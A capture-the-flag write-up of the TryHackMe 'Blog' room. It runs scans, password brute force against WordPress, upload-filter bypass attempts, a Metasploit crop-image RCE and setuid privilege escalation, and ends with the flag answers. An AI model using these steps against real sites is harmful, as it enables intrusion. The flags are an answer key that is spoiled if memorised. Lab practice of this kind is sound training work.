---
Category: CTF
LAB: https://tryhackme.com/room/blog
Difficulty: Medium
Featured: yes
cssclasses:
---
---

# Information / Description

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

**In order to get the blog to work with AWS, you'll need to add MACHINE_IP blog.thm to your /etc/hosts file.**blog

![](../../0.%20Assets/Blog-1784634483100.webp)

---

# Walkthrough

We have different questions for the machine that I will be answering on them and how to get there step by step in the `Lab specific questions` and we will use this part of the walkthrough as general points and commands we use during the pentest.

| `IP target machine` | 10.130.133.211 |
| ------------------- | -------------- |
| `IP kali machine`   | 10.130.168.162 |
## Enumeration

First of all we will do some enumeration to see what we are dealing with, I will personally start with `nmap`

```
sudo nmap -sV -sC -sS --min-rate 5000 -p- 10.130.133.211 -oX blog.xml
```

This command uses the `NSE` scripts to determine extra information about the target, also does the versioning and uses the `TCP Syn` scan with the `--min-rate <number>` to make it fast, and finally scanning all `65535 tcp ports` while exporting the results to an `.xml` file for later if we want to import in `metasploit`
### Results

```
root@ip-10-130-168-162:~# sudo nmap -sV -sC -sS --min-rate 5000 -p- 10.130.145.234 -oX blog.xml
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-21 09:29 UTC
Nmap scan report for ip-10-130-145-234.eu-west-3.compute.internal (10.130.145.234)
Host is up (0.00025s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
MAC Address: 0E:D8:80:84:C8:2F (Unknown)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-07-21T09:30:03
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2026-07-21T09:30:03+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.09 seconds
```



| Finding                  | Evidence                                     | Why it may be important                                                                             |
| ------------------------ | -------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| SSH                      | Port `22` — `OpenSSH 7.6p1 Ubuntu`           | Credentials found through WordPress or SMB may be reused for SSH access.                            |
| WordPress website        | Port `80` — Apache `2.4.29`, WordPress `5.0` | Main web attack surface. The WordPress version, users, plugins and themes should be enumerated.     |
| `robots.txt`             | Disallows `/wp-admin/`                       | Reveals that the WordPress administration area exists and should be checked during web enumeration. |
| SMB / Samba              | Ports `139` and `445` — Samba `4.7.6-Ubuntu` | May expose readable shares, files, usernames or credentials useful for WordPress or SSH.            |
| Guest SMB access         | Nmap connected using the `guest` account     | Guest-accessible shares may be available without credentials.                                       |
| SMB signing not required | `message signing: disabled` / `not required` | Indicates a weaker SMB configuration and confirms that SMB needs further enumeration.               |


![](../../0.%20Assets/Blog-1784626514685.webp)

Checking for the `Robots.txt` file we see that it shows login forms for WordPress but when you try to access them it doesn't find the location so it must be hidden behind something, let's keep digging to see if we find something

## Samba

Let's try listing the `shares` of the server without any password

```
┌──(marc㉿martin)-[~/Desktop]
└─$ smbclient -L //10.130.133.211 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG
```

Okay cool! we found a share: `BillySMB`

```
┌──(marc㉿martin)-[~/Desktop]
└─$ smbclient //10.130.133.211/BillySMB -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue May 26 20:17:05 2020
  ..                                  D        0  Tue May 26 19:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020
  check-this.png                      N     3082  Tue May 26 20:13:43 2020
```

![](../../0.%20Assets/Blog-1784635710281.webp)

I checked the 3 files in the properties and i even opened the `QR` and only got a youtube video from a song so nothing here


## Wordpress
### Directory Bruteforce

```
gobuster dir -u http://10.130.145.234 -w /usr/share/wordlists/dirb/common.txt -b '404'
```

| Finding                    | Evidence                                                                                  | Why it may be important                                                                                                                   |
| -------------------------- | ----------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| WordPress admin login      | `/admin` and `/dashboard` redirect to `/wp-admin/`; `/login` redirects to `/wp-login.php` | Confirms the WordPress administration and login endpoints.                                                                                |
| `robots.txt`               | `200 OK`                                                                                  | Its contents may reveal paths intentionally excluded from search engines.                                                                 |
| XML-RPC enabled            | `/xmlrpc.php` returns `405 Method Not Allowed`                                            | The endpoint exists; `405` is expected when accessing XML-RPC with `GET`. It may provide additional WordPress functionality to enumerate. |
| WordPress directories      | `/wp-admin/`, `/wp-content/`, `/wp-includes/` return `301`                                | Confirms a standard WordPress installation. `wp-content` is especially relevant for discovering plugins, themes and uploads.              |
| Server status endpoint     | `/server-status` returns `403 Forbidden`                                                  | Apache’s status module appears to be enabled but protected. It could expose useful server information if an access-control issue exists.  |
| Apache configuration files | `/.htaccess`, `/.htpasswd` and `/.hta` return `403 Forbidden`                             | The files appear to exist but are correctly blocked from direct access.                                                                   |
| WordPress feeds            | `/feed/`, `/rss/`, `/rss2/`, `/atom/` and `/rdf/` redirect successfully                   | Feeds can reveal post content, usernames, dates and other information useful for web enumeration.                                         |

From here, some interesting directories are `robots`, `login`, `wp-includes` and `xmlrpc.php` which is an `api endpoint`  

### Directory listing

![](../../0.%20Assets/Blog-1784626975107.webp)

Directory listing is enabled which is good for us we even found and API endpoint but I didn't get much from it

### Logging
And `login` redirected correctly to the WordPress login

![](../../0.%20Assets/Blog-1784634659718.webp)

Now let's enumerate the users and such with `wpscan` and see if we can access the wordpress


### wpscan

```
wpscan --url http://10.130.133.211/ --enumerate u
```


| Finding                          | Evidence                                    | Why it may be important                                                                                                       |
| -------------------------------- | ------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------- |
| WordPress version                | WordPress `5.0`                             | This is an old version and may be affected by known vulnerabilities.                                                          |
| Valid WordPress usernames        | `bjoel` and `kwheel`                        | These are valid login usernames and can be used for authorised password testing in the lab.                                   |
| XML-RPC enabled                  | `/xmlrpc.php` is accessible                 | An additional WordPress endpoint that may expose functionality or information not available through the normal web interface. |
| Upload directory listing enabled | `/wp-content/uploads/`                      | Directory listing can expose uploaded files, old backups, images, documents or other sensitive content.                       |
| WordPress readme exposed         | `/readme.html`                              | Confirms WordPress installation details and can help identify the installed version.                                          |
| `robots.txt` entries             | `/wp-admin/` and `/wp-admin/admin-ajax.php` | Reveals WordPress administration-related endpoints.                                                                           |
| WP-Cron enabled                  | `/wp-cron.php`                              | Confirms the external WordPress scheduled-task endpoint is accessible.                                                        |
we found users
- `bjoel`
- `kwheel`
- `Karen Wheeler`
- `Billy Joel`

We could use them to brute force, and we will use `rockyou`

```
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

```
wpscan --url http://10.130.133.211/ -U bjoel --passwords /usr/share/wordlists/rockyou.txt
```

I did this with all users

finding the user `kwheel` and its password `cutiepie1`

![](../../0.%20Assets/Blog-1784634274298.webp)

Now we can log in with these credentials

![](../../0.%20Assets/Blog-1784634748029.webp)

I didn't find anything crazy so I went back to enumerate `plugins` and `themes`

```
wpscan --url http://10.130.133.211/ --enumerate t  # Themes
wpscan --url http://10.130.133.211/ --enumerate p  # Plugins
```

I didn't find any `Plugins` (that is correct because even when logged into the webserver we didn't see any)

And I found some `Themes`


| Theme             | Installed version | Why it may be important                                                                          |
| ----------------- | ----------------- | ------------------------------------------------------------------------------------------------ |
| `twentynineteen`  | `1.5`             | Outdated default WordPress theme. Check whether this specific version has known vulnerabilities. |
| `twentyseventeen` | `2.3`             | Outdated default WordPress theme. Check whether this specific version has known vulnerabilities. |
| `twentysixteen`   | `2.1`             | Outdated default WordPress theme. Check whether this specific version has known vulnerabilities. |
| `twentytwenty`    | `1.3`             | Outdated default WordPress theme. Check whether this specific version has known vulnerabilities. |

When I used `searchsploit` I didn't find anything related to those themes so let's look further in the internet to see what we can find.

None seem super vulnerable to important vulnerabilities so we will come back to them after if wee need to.

I found the `Upload` folder from `wordpress` let's try uploading a reverse shell to it so see if we get any potential entry point to the server.

![](../../0.%20Assets/Blog-1784636255427.webp)

Let's try uploading one of the default `webshells` from kali to see if we are lucky.

![](../../0.%20Assets/Blog-1784636435019.webp)

![](../../0.%20Assets/Blog-1784636466539.webp)

okay so we can't upload `php` files, let's see if we can bypass it with `burpsuite`

I was trying to upload the file as `.php` and then modify the request but I was encountering an error so I changed the name directly and let's see if this works

![](../../0.%20Assets/Blog-1784636570691.webp)


Looks like we bypassed that security measure

![](../../0.%20Assets/Blog-1784636646185.webp)

Let's see what else we can do

I tried uploading the `php` script as a `jpeg` using the `NULL byte` 

![](../../0.%20Assets/Blog-1784638185409.webp)

And even though it worked it just cropped the name to `.php00.jpeg` which triggers an error and does not upload as an `.php`

![](../../0.%20Assets/Blog-1784638257375.webp)

## WordPress vulnerabilities

Even though I didn't find any vulnerabilities for the `plugins` or `themes` we can still try `WordPress` itself 

```
searchsploit wordpress 5.0
```


![](../../0.%20Assets/Blog-1784638220770.webp)

And look, we even found a `metasploit` exploit for us to use.


```
msf6 > search wordpress 5.0

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1   exploit/unix/webapp/wp_property_upload_exec              2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2   exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce    2023-05-31       excellent  Yes    Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode

```

we will use `exploit/multi/http/wp_crop_rce`

Set the proper settings and we get a `meterpreter` (finally!)

inside meterpreter I move to the shell and look for the `/home` directory

```
meterpreter > shell

bash -i


www-data@blog:/var/www/wordpress$ ../../../
www-data@blog:/home/bjoel$ dir
dir
Billy_Joel_Termination_May20-2020.pdf  user.txt

# Looks like we found the user flag

www-data@blog:/home/bjoel$ cat user.txt
cat user.txt
You won't find what you're looking for here.

TRY HARDER
www-data@blog:/home/bjoel$ find / -iname user.txt 2>/dev/null
find / -iname user.txt 2>/dev/null

```


![](../../0.%20Assets/Blog-1784639389550.webp)

I also tried opening the `pdf` with `strings` because it was crooked, so I went back to `meterpreter` and easily downloaded the file

![](../../0.%20Assets/Blog-1784639465926.webp)

But when opening the pdf

![](../../0.%20Assets/Blog-1784639698770.webp)

Nothing really super important so I moved to elevating privileges to see if i can scrape something

Let's look for files with the `sticky bit` and with a bit of luck we will find one created by the `root` user

```
www-data@blog:/home/bjoel$ find / -type f -perm -4000 2>/dev/null
```

and found

```
/usr/sbin/checker
```

This looks like a file created from a user not the system

![](../../0.%20Assets/Blog-1784639985635.webp)

Bingo, it's from the root user and has the `sticky bit` let's try to exploit this

let's see see what does internally with `ltrace`

### ltrace

`ltrace` shows the library function calls a program makes while it runs.


![](../../0.%20Assets/Blog-1784640099341.webp)

Here, it revealed that `checker` calls:

```
getenv("admin")
```

So it checks whether the `admin` environment variable exists.

Let's export the environment variable to 1

![](../../0.%20Assets/Blog-1784640207501.webp)

Bingo, we are root, now let's look for the `user.txt` again with `find`

![](../../0.%20Assets/Blog-1784640237929.webp)

And now we found the real flag

![](../../0.%20Assets/Blog-1784640259592.webp)

```
c8421899aae571f7af486492b71a8ab7
```

now for the root flag, we will again look for it using `find`

![](../../0.%20Assets/Blog-1784640324585.webp)

![](../../0.%20Assets/Blog-1784640349041.webp)

```
9a0b2b618bef9bfa7ac28c1353d9f318
```


---

# Lab specific questions


## root.txt

```
9a0b2b618bef9bfa7ac28c1353d9f318
```


## user.txt

```
c8421899aae571f7af486492b71a8ab7
```



## Where was user.txt found?

```
/media/usb
```



## What CMS was Billy using?

```
Wordpress
```


## What version of the CMS was running?

```
5.0
```

